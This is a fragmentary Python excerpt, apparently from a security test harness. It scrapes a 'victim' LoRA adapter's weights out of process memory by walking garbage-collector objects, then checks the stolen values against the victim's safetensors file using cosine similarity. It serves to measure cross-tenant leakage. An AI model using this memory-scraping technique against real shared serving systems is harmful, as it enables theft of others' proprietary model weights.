            ...
            for gc_obj in _gc.get_objects():
                try:
                    ...
                    if v_vecs:
                        ...
                        wrs["stolen_flat"] = [round(float(x),6)
                                              for x in _torch.cat(v_vecs).flatten()[:512].tolist()]
                        wrs["recovery"] = 1.0
...
# ── Post-hoc WRS verification: compare stolen data against victim's known weights ──
# The payload saved stolen_flat from victim's memory cells.
# Here (outside the blind payload) we load the victim's safetensors and compare.
# High cosine similarity = the bytes we read ARE the victim's actual adapter weights.
stolen_flat = wrs.get("stolen_flat", [])
if stolen_flat:
    try:
        import torch as _tv
        from safetensors.torch import load_file as _lf
        sf_path = os.path.join(victim_file, "adapter_model.safetensors")
        victim_sf = _lf(sf_path)
        victim_all = _tv.cat([v.float().flatten() for v in victim_sf.values()])
        stolen_t = _tv.tensor(stolen_flat).float()
        n = min(len(stolen_t), len(victim_all))
        # Direct cosine similarity — high if cell layout matches
        cos_direct = round(float(_tv.nn.functional.cosine_similarity(
            stolen_t[:n].unsqueeze(0), victim_all[:n].unsqueeze(0))), 4)
        # Sorted cosine similarity — order-independent, high if same weight VALUES present
        s_sorted = stolen_t.sort().values
        v_sorted = victim_all[:n].sort().values
        cos_sorted = round(float(_tv.nn.functional.cosine_similarity(
            s_sorted.unsqueeze(0), v_sorted.unsqueeze(0))), 4)
        wrs["victim_weight_cosine_sim_direct"] = cos_direct
        wrs["victim_weight_cosine_sim_sorted"] = cos_sorted
    except Exception as e:
...
result = {
    ...
    "data_theft": {
        "wrs_auth": {
            ...
            "victim_weight_cosine_sim_sorted": wrs.get("victim_weight_cosine_sim_sorted"),
...
print(f"  WRS-auth       : recovery={wrs_recovery:.2f}  victim_cells={wrs.get('victim_cells_count',0)}  disjoint={wrs.get('cells_disjoint')}  vs_attacker={wrs.get('victim_vs_attacker_cosine_sim')}  vs_real_direct={wrs.get('victim_weight_cosine_sim_direct')}  vs_real_sorted={wrs.get('victim_weight_cosine_sim_sorted')}")
